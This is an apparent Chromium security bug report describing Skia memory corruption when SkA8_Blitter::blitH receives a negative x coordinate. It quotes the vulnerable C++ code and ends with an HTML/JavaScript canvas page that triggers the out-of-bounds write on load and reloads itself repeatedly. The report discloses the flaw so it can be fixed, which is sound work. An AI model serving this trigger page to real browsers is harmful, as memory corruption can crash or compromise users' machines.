<title>Issue 24646 -   chromium -    Security: Skia memory corruption with x&lt;0 in SkA*_Blitter::blitH - Project Hosting on Google Code</title> <pre> SkA8_Blitter::blitH can be called with x &lt; 0  which triggers an ASSERT and   later causes memory corruption:    void SkA8_Blitter::blitH(int x  int y  int width)  {      SkASSERT(x &gt;= 0 &amp;&amp; y &gt;= 0 &amp;&amp; (unsigned)(x + width) &lt;=   (unsigned)fDevice.width());        if (fSrcA == 0)          return;        uint8_t* device = fDevice.getAddr8(x  y);        if (fSrcA == 255)      {          memset(device  0xFF  width);      }      else      {          unsigned scale = 256 - SkAlpha255To256(fSrcA);          unsigned srcA = fSrcA;            for (int i = 0; i &lt; width; i++)          {              device[i] = SkToU8(srcA + SkAlphaMul(device[i]  scale));          }      }  }    Negative x will cause an incorrect pointer being returned by   &quot;fDevice.getAddr8(x  y);&quot;    inline uint8_t* SkBitmap::getAddr8(int x  int y) const {      SkASSERT(fPixels);      SkASSERT(fConfig == kA8_Config || fConfig == kIndex8_Config);      SkASSERT((unsigned)x &lt; fWidth &amp;&amp; (unsigned)y &lt; fHeight);      return (uint8_t*)fPixels + y * fRowBytes + x;  }    The pointer is used to write data  which causes incorrect memory to be   overwritten.    Repro code:    &lt;HTML&gt;    &lt;BODY onload=&quot;go();&quot;&gt;&lt;/BODY&gt;    &lt;SCRIPT&gt;      function go() {        oCanvas=document.createElement(&quot;CANVAS&quot;);        oCanvas.width=1000;        o2dContext=oCanvas.getContext(&quot;2d&quot;);        o2dContext.shadowBlur=9;        o2dContext.setTransform(0 9 .000001 10000 0 0);        o2dContext.transform(0 100 71 9 0 7);        o2dContext.setTransform(0 6 95 4 1 0);        o2dContext.fillRect(.0 -9 5 39);        setTimeout(&quot;location.reload();&quot;  1);      }    &lt;/SCRIPT&gt;  &lt;/HTML&gt; </pre>